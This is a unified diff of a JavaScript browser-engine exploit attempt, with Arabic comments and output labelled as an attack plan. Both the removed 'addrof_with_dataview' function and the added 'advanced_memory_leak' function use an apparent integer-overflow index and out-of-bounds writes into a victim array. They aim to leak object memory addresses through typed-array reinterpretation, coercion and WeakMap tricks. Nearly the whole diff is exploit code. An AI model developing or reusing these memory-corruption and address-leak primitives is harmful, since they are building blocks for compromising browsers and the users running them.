@@ -1,59 +1,67 @@
-function addrof_with_dataview() {
-    let output = "🔄 **تسريب العناوين باستخدام DataView**\n\n";
+function advanced_memory_leak() {
+    let output = "🏗️ **استغلال بنية الذاكرة المباشرة**\n\n";
     
     let arr = [];
     for (let i = 0; i < 2000; i++) arr[i] = i + 0.1;
     for (let i = 0; i < (1 << 22); i++) arr[i] = i + 0.1;
     
-    let target_obj = {
-        unique: 0xDEADBEEF,
-        data: "TARGET"
-    };
+    // إنشاء كائنات متعددة بأنماط مميزة
+    let objects = [];
+    for (let i = 0; i < 4; i++) {
+        objects.push({
+            id: i,
+            pattern: 0x1000 * (i + 1),
+            marker: `OBJ_${i}`
+        });
+    }
     
-    let victim = [1.1, 2.2, 3.3];
+    let victim = [1.1, 2.2, 3.3, 4.4];
     let largeLength = Object.keys(arr).length;
     let index = (largeLength << 3) >> 31;
     
-    // الطريقة: تخزين الكائن ثم محاولة قراءته كبايتات خام
+    output += "🧩 خطة الهجوم:\n";
+    output += "1. حقن كائنات متعددة\n";
+    output += "2. البحث عن أنماط في الذاكرة\n";
+    output += "3. استنتاج العناوين من الأنماط\n\n";
+    
+    // حقن الكائنات في مواقع مختلفة
     for (let i = 1; i >= index; i--) {
-        victim[i] = target_obj;
+        if (i === 1) victim[i] = objects[0];
+        if (i === 0) victim[i] = objects[1];
     }
     
-    output += "محاولات قراءة البيانات الخام:\n\n";
-    
-    // المحاولة 1: استخدام ArrayBuffer لنقل البيانات
-    try {
-        let ab = new ArrayBuffer(8);
-        let dv = new DataView(ab);
-        let f64 = new Float64Array(ab);
-        
-        f64[0] = victim[1]; // نسخ القيمة
-        
-        let as_bigint = dv.getBigUint64(0, true);
-        output += `كـ BigInt: 0x${as_bigint.toString(16)}\n`;
-        
-        if (as_bigint !== 0x7ff8000000000000n) {
-            output += "✅ عنوان غير قياسي!\n";
+    output += "الحالة بعد الحقن:\n";
+    for (let i = 0; i < victim.length; i++) {
+        output += `victim[${i}]: ${typeof victim[i]}`;
+        if (typeof victim[i] === 'object') {
+            output += ` (${victim[i].marker})`;
         }
-    } catch(e) {
-        output += `خطأ 1: ${e.message}\n`;
+        output += "\n";
     }
     
-    // المحاولة 2: استخدام Typed Arrays مختلفة
+    // محاولة إنشاء موقف يمكننا من رؤية العناوين
+    output += "\n🔍 محاولة رؤية العناوين عبر الأخطاء:\n";
+    
     try {
-        let buffer = new ArrayBuffer(16);
-        let f64_view = new Float64Array(buffer);
-        let u32_view = new Uint32Array(buffer);
-        
-        f64_view[0] = victim[1];
-        
-        output += `كـ Uint32: [0x${u32_view[1].toString(16)}, 0x${u32_view[0].toString(16)}]\n`;
-        output += `المجموع: 0x${((BigInt(u32_view[1]) << 32n) | BigInt(u32_view[0])).toString(16)}\n`;
+        // جعل المحرك يحاول تفسير الكائن كمؤشر
+        let forced_conversion = Number(victim[1]);
+        output += `التحويل القسري: ${forced_conversion}\n`;
     } catch(e) {
-        output += `خطأ 2: ${e.message}\n`;
+        output += `خطأ في التحويل: ${e.message}\n`;
+    }
+    
+    // طريقة بديلة: استخدام WeakMap
+    try {
+        let wm = new WeakMap();
+        wm.set(victim[1], "test_value");
+        
+        // هذه قد تكشف معلومات عن العنوان
+        output += `WeakMap.set نجح\n`;
+    } catch(e) {
+        output += `WeakMap خطأ: ${e.message}\n`;
     }
     
     alert(output);
 }
 
-addrof_with_dataview();
+advanced_memory_leak();
